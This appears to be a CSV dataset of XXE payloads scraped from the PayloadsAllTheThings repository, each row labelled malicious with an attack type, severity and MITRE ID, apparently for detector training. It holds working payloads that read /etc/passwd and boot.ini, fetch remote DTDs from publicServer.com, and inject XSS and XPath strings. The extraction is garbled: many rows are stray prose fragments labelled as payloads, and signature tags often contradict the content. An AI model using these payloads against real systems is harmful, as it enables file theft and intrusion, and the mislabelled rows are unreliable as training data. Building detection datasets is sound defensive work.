Payload,Signature,AttackType,Severity,MITRE,Label,Description
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Then update the file """,SQLi_Keyword,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Extract Excel file: """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Warning: Use """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (<https://infozip.sourceforge.net/Zip.html>) and not ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (<https://p7zip.sourceforge.net/>) or ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (<https://www.7-zip.org/>) because they won't recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file. A valid  magic byte signature with (,CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
) will be shown as ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (with ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
) and an invalid one will be shown as ,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Add your blind XXE payload inside """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Most XXE payloads detailed above require control over both the DTD or """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 block as well as the ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
&file;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
&file;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Jean &xxe; Dupont,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
42 rue du CTF,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Paris,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
&send;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%init; ]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><test></test>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]><foo>&xxe;</foo>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///c:/boot.ini"" >]>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com:80"" >]><foo>&xxe;</foo>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example:443"" >]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<test></test>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<![CDATA[<test></test>]]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
&foo;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%foo;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
count(/child::node()),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
x' or name()='username' or 'x'='y,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XSS_Script,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>,XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<foo><![CDATA[' or 1=1 or ''=']]></foo>,XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xml SRC=""xsstest.xml"" ID=I></xml>",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><script>alert(123)</script></xsl:template></xsl:stylesheet>",XSS_Script,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><change-log><text>Hello World</text></change-log>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><change-log><text>&quot;Hello World&quot;</text></change-log>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""> ]><change-log><text>Hello &myEntity;</text></change-log>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><!DOCTYPE change-log[ <!ENTITY myEntity ""World""><!ENTITY myQuote ""&quot;""> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<change-log> <text>&systemEntity;</text> </change-log>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text> </change-log>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""../../../../boot.ini""> ]> <change-log> <text>&systemEntity;</text> </change-log>",DirTraversal_Path,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM ""robots.txt""> ]> <change-log> <text>&systemEntity;</text>; </change-log>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>,XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?><change-log><text><script>alert(1)</script></text></change-log>",XSS_Script,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
count(/child::node()),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
x' or name()='username' or 'x'='y,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XSS_Script,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",XSS_Script,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""https://crowdshield.com/.testing/rfi_vuln.txt"">]><foo>&xxe;</foo>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
